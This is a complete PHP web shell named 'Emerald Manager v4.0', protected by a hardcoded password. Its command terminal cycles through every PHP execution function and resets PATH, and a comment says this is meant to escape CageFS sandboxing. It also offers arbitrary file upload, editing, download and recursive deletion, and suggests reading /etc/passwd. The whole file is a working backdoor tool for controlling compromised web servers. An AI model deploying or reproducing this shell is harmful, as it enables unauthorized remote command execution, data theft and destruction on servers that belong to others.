<?php
/**
 * EMERALD MANAGER v4.0 - ULTIMATE EDITION
 * Professional UI | Multi-Bypass CMD | Full File Management
 */
session_start();

// --- KONFIGURASI AKSES ---
$password = 'litev4'; 
$auth_key = 'emerald_v4_ultimate';

if (isset($_POST['p']) && $_POST['p'] === $password) { $_SESSION[$auth_key] = true; }
if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

if (!isset($_SESSION[$auth_key])) {
    die('<html><head><title>Emerald Login</title><style>body{background:#060a09;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;}.login-card{background:#0d1412;padding:40px;border-radius:15px;border:1px solid #1f3a2f;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.5);}input{padding:12px;border-radius:8px;border:1px solid #1f3a2f;background:#060a09;color:#0f8;margin:15px 0;width:250px;text-align:center;}button{background:#008f58;color:#fff;border:none;padding:12px 30px;border-radius:8px;cursor:pointer;font-weight:bold;transition:0.3s;}button:hover{background:#00ff88;color:#000;}</style></head><body><div class="login-card"><h2>EMERALD V4.0</h2><form method="POST"><input type="password" name="p" placeholder="Enter Secret Key" autofocus><br><button type="submit">AUTHENTICATE</button></form></div></body></html>');
}

// --- CORE TERMINAL BYPASS ---
function ultimate_terminal($cmd) {
    $out = ''; $cmd = $cmd . " 2>&1";
    // Menambah jalur binari umum untuk menembus CageFS
    $path_env = "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin ";
    $cmd = $path_env . $cmd;

    $methods = array('shell_exec', 'exec', 'passthru', 'system', 'popen', 'proc_open');
    foreach ($methods as $m) {
        if (function_exists($m)) {
            if ($m == 'exec') { @$m($cmd, $r); $out = join("\n", $r); }
            elseif ($m == 'popen') { $h = @$m($cmd, 'r'); if($h){ while(!feof($h)){ $out .= fread($h, 1024); } pclose($h); } }
            elseif ($m == 'proc_open') {
                $ds = array(0=>array("pipe","r"), 1=>array("pipe","w"), 2=>array("pipe","w"));
                $p = @proc_open($cmd, $ds, $pi);
                if (is_resource($p)) { $out = stream_get_contents($pi[1]); fclose($pi[1]); @proc_close($p); }
            } else { ob_start(); @$m($cmd); $out = ob_get_clean(); }
            if (!empty($out)) return $out;
        }
    }
    return ($out) ? $out : "FAIL: Server configuration blocks all execution methods.";
}

// --- PENGATURAN DIREKTORI ---
$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
$dir = str_replace('\\', '/', $dir);
@chdir($dir);
$dir = getcwd();
$msg = ''; $cmd_out = '';

// --- DOWNLOAD HANDLER ---
if (isset($_GET['dl'])) {
    $file = $_GET['dl'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// --- POST ACTIONS ---
if (isset($_POST['cmd_input'])) { $cmd_out = ultimate_terminal($_POST['cmd_input']); }
if (isset($_FILES['file_up'])) { 
    if (@move_uploaded_file($_FILES['file_up']['tmp_name'], $dir.'/'.$_FILES['file_up']['name'])) $msg = "Upload Success!"; 
}
if (isset($_POST['act'])) {
    $fn = $_POST['fn'];
    switch ($_POST['act']) {
        case 'save': if(@file_put_contents($fn, $_POST['content']) !== false) $msg = "File Saved: $fn"; break;
        case 'mkdir': if(@mkdir($fn)) $msg = "Folder Created: $fn"; break;
        case 'rename': if(@rename($_POST['old'], $_POST['new'])) $msg = "Rename OK"; break;
        case 'mass_delete':
            if (isset($_POST['items'])) {
                foreach ($_POST['items'] as $it) {
                    if(is_dir($it)){ 
                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($it, 0x1000), 1);
                        foreach($files as $f){ @(is_dir($f)?rmdir($f):unlink($f)); } @rmdir($it);
                    } else { @unlink($it); }
                } $msg = "Items Deleted.";
            } break;
    }
}
if (isset($_GET['rm'])) { @unlink($_GET['rm']); @rmdir($_GET['rm']); $msg = "Deleted."; }

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Emerald Manager v4.0</title>
    <style>
        :root { --green: #00ff88; --bg: #0b0e0d; --card: #111a16; --border: #1f3a2f; }
        body { background: var(--bg); color: #ccc; font-family: 'Inter', sans-serif; margin: 0; display: flex; overflow: hidden; }
        
        /* Sidebar Navigation */
        .sidebar { width: 320px; height: 100vh; background: #080c0b; border-right: 1px solid var(--border); padding: 30px; box-sizing: border-box; overflow-y: auto; }
        .sidebar h1 { color: var(--green); font-size: 20px; letter-spacing: 2px; border-bottom: 2px solid var(--green); padding-bottom: 10px; margin-bottom: 30px; }
        
        /* Main Space */
        .main { flex-grow: 1; height: 100vh; overflow-y: auto; padding: 40px; box-sizing: border-box; }
        
        /* Components */
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
        h3 { color: var(--green); font-size: 13px; text-transform: uppercase; letter-spacing: 1px; margin-top: 0; }
        
        input, textarea, select { background: #060a09; border: 1px solid var(--border); color: #fff; padding: 12px; border-radius: 6px; width: 100%; margin: 8px 0; box-sizing: border-box; }
        input:focus, textarea:focus { border-color: var(--green); outline: none; }
        
        .btn { background: #008f58; color: white; border: none; padding: 12px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.2s; }
        .btn:hover { background: var(--green); color: #000; box-shadow: 0 0 10px var(--green); }
        .btn-logout { background: #600; margin-top: 20px; }

        /* File Table */
        table { width: 100%; border-collapse: collapse; }
        th { text-align: left; color: #555; font-size: 12px; padding: 12px; border-bottom: 2px solid var(--border); }
        td { padding: 12px; border-bottom: 1px solid #16241e; font-size: 14px; }
        tr:hover { background: #16241e; }
        
        .link { color: var(--green); text-decoration: none; font-weight: bold; }
        .act-link { color: #00d2ff; text-decoration: none; font-size: 12px; margin-right: 10px; border: 1px solid #00d2ff; padding: 2px 6px; border-radius: 4px; }
        .act-link:hover { background: #00d2ff; color: #000; }
        
        pre { background: #000; color: #0f8; padding: 20px; border-radius: 8px; border: 1px solid var(--green); font-family: monospace; max-height: 400px; overflow: auto; }
        .msg { background: #00ff8811; color: var(--green); border: 1px solid var(--green); padding: 15px; border-radius: 8px; margin-bottom: 25px; }
    </style>
</head>
<body>

    <div class="sidebar">
        <h1>EMERALD 4.0</h1>
        
        <div class="card">
            <h3>Upload File</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="file_up">
                <button type="submit" class="btn">UPLOAD</button>
            </form>
        </div>

        <div class="card">
            <h3>Quick Actions</h3>
            <form method="POST">
                <input type="hidden" name="act" value="mkdir">
                <input type="text" name="fn" placeholder="New Folder Name">
                <button type="submit" class="btn">CREATE FOLDER</button>
            </form>
            <form method="POST" style="margin-top:15px;">
                <input type="hidden" name="act" value="save">
                <input type="text" name="fn" placeholder="New File (e.g. info.php)">
                <button type="submit" class="btn">CREATE FILE</button>
            </form>
        </div>

        <div class="card">
            <h3>Rename</h3>
            <form method="POST">
                <input type="hidden" name="act" value="rename">
                <input type="text" name="old" placeholder="Old Name">
                <input type="text" name="new" placeholder="New Name">
                <button type="submit" class="btn">RENAME ITEM</button>
            </form>
        </div>

        <a href="?logout=1" class="btn btn-logout" style="display:block; text-align:center; text-decoration:none;">LOGOUT</a>
    </div>

    <div class="main">
        <?php if($msg) echo "<div class='msg'>$msg</div>"; ?>
        
        <div class="card">
            <h3>Current Path</h3>
            <div style="color:var(--green); font-weight:bold;"><?= $dir ?></div>
        </div>

        <div class="card">
            <h3>Terminal Bypass (LiteSpeed)</h3>
            <form method="POST">
                <input type="text" name="cmd_input" placeholder="Enter Command (e.g: ls -la / whoami / cat /etc/passwd)">
                <button type="submit" class="btn" style="margin-top:10px;">EXECUTE COMMAND</button>
            </form>
            <?php if($cmd_out): ?>
                <h4 style="margin-bottom:5px; color:#555;">Output:</h4>
                <pre><?= htmlspecialchars($cmd_out) ?></pre>
            <?php endif; ?>
        </div>

        <div class="card">
            <form method="POST" onsubmit="return confirm('Mass Delete?')">
                <input type="hidden" name="act" value="mass_delete">
                <h3>Explorer 
                    <button type="submit" style="float:right; background:#600; border:none; color:#fff; padding:5px 12px; cursor:pointer; font-size:11px; border-radius:4px;">DELETE SELECTED</button>
                </h3>
                <table>
                    <thead>
                        <tr>
                            <th width="30"><input type="checkbox" onclick="for(c of document.getElementsByName('items[]')) c.checked=this.checked"></th>
                            <th>NAME</th>
                            <th>TYPE</th>
                            <th>SIZE</th>
                            <th>ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr><td></td><td><a href="?d=<?= urlencode(dirname($dir)) ?>" class="link">.. [ PARENT ]</a></td><td>DIR</td><td>-</td><td>-</td></tr>
                        <?php
                        $files = scandir('.');
                        $dirs = []; $regs = [];
                        foreach($files as $f) {
                            if($f == '.' || $f == '..') continue;
                            is_dir($f) ? $dirs[]=$f : $regs[]=$f;
                        }
                        sort($dirs); sort($regs);
                        foreach($dirs as $f) {
                            echo "<tr>
                                <td><input type='checkbox' name='items[]' value='".htmlspecialchars($f)."'></td>
                                <td><a href='?d=".urlencode($dir."/".$f)."' class='link'>📁 ".htmlspecialchars($f)."</a></td>
                                <td>DIR</td><td>-</td>
                                <td><a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='act-link' style='color:red;border-color:red;' onclick='return confirm(\"Del?\")'>RM</a></td>
                            </tr>";
                        }
                        foreach($regs as $f) {
                            $sz = round(filesize($f)/1024, 2).' KB';
                            echo "<tr>
                                <td><input type='checkbox' name='items[]' value='".htmlspecialchars($f)."'></td>
                                <td>📄 ".htmlspecialchars($f)."</td>
                                <td>FILE</td><td>$sz</td>
                                <td>
                                    <a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='act-link'>EDIT</a>
                                    <a href='?d=".urlencode($dir)."&dl=".urlencode($f)."' class='act-link' style='color:#0f8;border-color:#0f8;'>GET</a>
                                    <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' class='act-link' style='color:red;border-color:red;' onclick='return confirm(\"Del?\")'>RM</a>
                                </td>
                            </tr>";
                        }
                        ?>
                    </tbody>
                </table>
            </form>
        </div>

        <div class="card">
            <h3>File Editor</h3>
            <form method="POST">
                <input type="hidden" name="act" value="save">
                <input type="text" name="fn" placeholder="filename.php" value="<?= isset($_GET['e'])?htmlspecialchars($_GET['e']):'' ?>">
                <textarea name="content" rows="18" placeholder="Source code..."><?php if(isset($_GET['e'])) echo htmlspecialchars(@file_get_contents($_GET['e'])); ?></textarea>
                <button type="submit" class="btn">SAVE CHANGES</button>
            </form>
        </div>
    </div>
</body>
</html>
